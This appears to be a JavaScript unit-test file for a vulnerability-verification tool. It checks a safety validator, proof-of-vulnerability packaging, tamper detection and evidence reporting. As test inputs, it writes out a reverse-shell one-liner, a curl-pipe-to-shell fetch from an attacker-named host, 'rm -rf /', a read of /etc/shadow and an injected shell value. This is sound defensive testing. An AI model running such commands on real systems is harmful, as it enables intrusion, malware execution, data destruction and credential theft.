import assert from 'assert';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { ProofOfVulnerability, PovStatus, PovDomain, PovMode } from '../src/core/pov/povTypes.js';
import { PovSafetyValidator } from '../src/core/pov/povSafetyValidator.js';
import { PovPackager } from '../src/core/pov/povPackager.js';
import { PovVerifier } from '../src/core/pov/povVerifier.js';
import { EvidenceDag, EvidenceNodeType, EvidenceEdgeRelation } from '../src/core/bep/evidenceDag.js';
import { AnalystDossier } from '../src/core/analyst/analystDossier.js';

console.log('=====================================================');
console.log('   HWSEC UNIT TESTS: PROOF-OF-VULNERABILITY (PoV)    ');
console.log('=====================================================\n');

const testTmpDir = path.resolve('hwsec-output', 'test_pov_unit_' + Date.now());
fs.mkdirSync(testTmpDir, { recursive: true });

try {
    // 1. Schema & Status Model
    console.log('[Test 1] PoV Schema and State Machine Initialization');
    const pov = new ProofOfVulnerability({
        vulnerability_class: 'CWE-78',
        domain: PovDomain.PYTHON,
        target: { path: 'vuln.py', entry_point: { file: 'vuln.py', line: 10 } },
        witness_input: { value: '; touch marker.tmp' }
    });
    assert.strictEqual(pov.status, PovStatus.NOT_REQUESTED);
    assert.strictEqual(pov.domain, PovDomain.PYTHON);
    assert.strictEqual(pov.vulnerability_class, 'CWE-78');
    assert.ok(pov.pov_id.startsWith('POV-'));
    console.log('  -> Initial schema validated.');

    // 2. Safety Validator - Dangerous patterns
    console.log('\n[Test 2] PoV Safety Validator Boundaries');
    
    // Reverse shell
    const revShell = PovSafetyValidator.validate({ command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' });
    assert.strictEqual(revShell.safe, false);
    assert.ok(revShell.violations.length > 0);
    console.log('  -> Blocked interactive reverse shell.');

    // Outbound network call
    const netCall = PovSafetyValidator.validate({ command: 'curl http://evil-attacker.com/malware.sh | sh' });
    assert.strictEqual(netCall.safe, false);
    console.log('  -> Blocked outbound external network access.');

    // Localhost allowed
    const localCall = PovSafetyValidator.validate({ command: 'curl http://localhost:8080/api/test' });
    assert.strictEqual(localCall.safe, true);
    console.log('  -> Permitted safe localhost connection.');

    // Destructive filesystem
    const destructive = PovSafetyValidator.validate({ command: 'rm -rf /' });
    assert.strictEqual(destructive.safe, false);
    console.log('  -> Blocked destructive filesystem command.');

    // Credential theft
    const credTheft = PovSafetyValidator.validate({ scriptContent: 'cat /etc/shadow' });
    assert.strictEqual(credTheft.safe, false);
    console.log('  -> Blocked credential harvesting attempt.');

    // 3. PoV Packager & Content Hashing
    console.log('\n[Test 3] PoV Packaging & Content-Addressed Bundling');
    pov.status = PovStatus.GENERATED;
    pov.reproduction.entry_script = 'reproduce.py';
    pov.reproduction.command = 'python3 reproduce.py';

    const testScript = `print("=== HWSEC Replay Test ===")\nprint("[!] SECURITY EFFECT CONFIRMED")\n`;
    const bundleDir = PovPackager.packageBundle(pov, testTmpDir, {
        scriptContent: testScript,
        evidenceNodes: ['HYP-TEST-01']
    });

    assert.ok(fs.existsSync(path.join(bundleDir, 'metadata.json')));
    assert.ok(fs.existsSync(path.join(bundleDir, 'README.md')));
    assert.ok(fs.existsSync(path.join(bundleDir, 'reproduce.py')));
    assert.ok(fs.existsSync(path.join(bundleDir, 'input', 'witness.json')));
    assert.ok(fs.existsSync(path.join(bundleDir, 'expected', 'effect.json')));
    assert.ok(fs.existsSync(path.join(bundleDir, 'evidence', 'dag_snapshot.json')));
    assert.ok(fs.existsSync(path.join(bundleDir, 'provenance', 'manifest.json')));

    const metadata = JSON.parse(fs.readFileSync(path.join(bundleDir, 'metadata.json'), 'utf-8'));
    assert.ok(metadata.bundle_manifest_hash);
    assert.strictEqual(typeof metadata.file_hashes, 'object');
    console.log(`  -> Packaged bundle at: ${bundleDir}`);
    console.log(`  -> Bundle manifest SHA-256: ${metadata.bundle_manifest_hash.substring(0, 16)}...`);

    // 4. Verifier Tamper Detection
    console.log('\n[Test 4] Verifier Tamper Detection & Cryptographic Integrity');
    const verifier = new PovVerifier();
    
    // Tamper with the reproduce.py script
    const scriptPath = path.join(bundleDir, 'reproduce.py');
    fs.writeFileSync(scriptPath, testScript + '\n# unauthorized modification\n');

    const tamperResult = await verifier.verifyPoV(bundleDir);
    assert.strictEqual(tamperResult.verified, false);
    assert.strictEqual(tamperResult.reasonCode, 'TAMPER_DETECTED');
    console.log('  -> Successfully detected artifact tampering (TAMPER_DETECTED).');

    // Restore clean state and update metadata hash
    fs.writeFileSync(scriptPath, testScript);
    const restoredBundle = PovPackager.packageBundle(pov, testTmpDir, {
        scriptContent: testScript,
        evidenceNodes: ['HYP-TEST-01']
    });

    // 5. Independent Sandbox Replay
    console.log('\n[Test 5] Independent Replay & Multi-Factor Observation');
    const cleanResult = await verifier.verifyPoV(restoredBundle);
    assert.strictEqual(cleanResult.verified, true);
    assert.strictEqual(cleanResult.povStatus, PovStatus.VERIFIED);
    assert.strictEqual(cleanResult.reasonCode, 'REPRODUCED_AND_VERIFIED');
    assert.strictEqual(cleanResult.replayLog.observations.security_effect_occurred, true);
    console.log('  -> Independent replay verified with status VERIFIED.');

    // 6. Evidence DAG Integration
    console.log('\n[Test 6] Evidence DAG Typed Node Integration');
    const dag = new EvidenceDag({ run_id: 'RUN-UNIT-01' });
    const hypNode = dag.addNode(EvidenceNodeType.HYPOTHESIS, { cwe: 'CWE-78', id: 'HYP-01' }, 'HYP-01');
    
    const { artifactNode, replayNode, verificationNode } = dag.attachPoV('HYP-01', pov, cleanResult.replayLog);
    assert.strictEqual(artifactNode.type, EvidenceNodeType.POV_ARTIFACT);
    assert.strictEqual(replayNode.type, EvidenceNodeType.POV_REPLAY);
    assert.strictEqual(verificationNode.type, EvidenceNodeType.POV_VERIFICATION);
    assert.strictEqual(verificationNode.data.verified, true);
    assert.strictEqual(verificationNode.data.pov_status, PovStatus.VERIFIED);

    const edges = dag.getOutgoingEdges('HYP-01');
    assert.ok(edges.some(e => e.target_id === artifactNode.id && e.relation === EvidenceEdgeRelation.SUPPORTS));
    assert.ok(edges.some(e => e.target_id === verificationNode.id && e.relation === EvidenceEdgeRelation.SUPPORTS));
    console.log('  -> DAG nodes attached and cross-referenced with SUPPORTS edges.');

    // 7. Analyst Dossier Integration
    console.log('\n[Test 7] Analyst Dossier PoV Rendering');
    const mockVerdict = {
        verdict: 'DETECTED',
        reason_code: 'OBLIGATIONS_SATISFIED',
        obligations: {
            concrete_execution_succeeded: true,
            security_oracle_fired: true,
            negative_control_passed: true,
            provenance_manifest_verified: true
        }
    };
    const dossier = AnalystDossier.generateCaseSummary(hypNode.data, dag, mockVerdict, pov, cleanResult.replayLog);
    assert.strictEqual(dossier.summary.pov_artifact.status, PovStatus.VERIFIED);
    assert.strictEqual(dossier.summary.pov_artifact.replay_result, 'PASS');
    assert.ok(dossier.markdown_dossier.includes('## 5. Proof-of-Vulnerability (PoV) Artifact & Replay'));
    assert.ok(dossier.markdown_dossier.includes('**PoV Status**: **`VERIFIED`**'));
    console.log('  -> Dossier correctly formatted with PoV artifact status.');

    console.log('\n[+] ALL PoV UNIT TESTS PASSED SUCCESSFULLY!');
} finally {
    // Cleanup temporary directory
    try {
        fs.rmSync(testTmpDir, { recursive: true, force: true });
    } catch {}
}
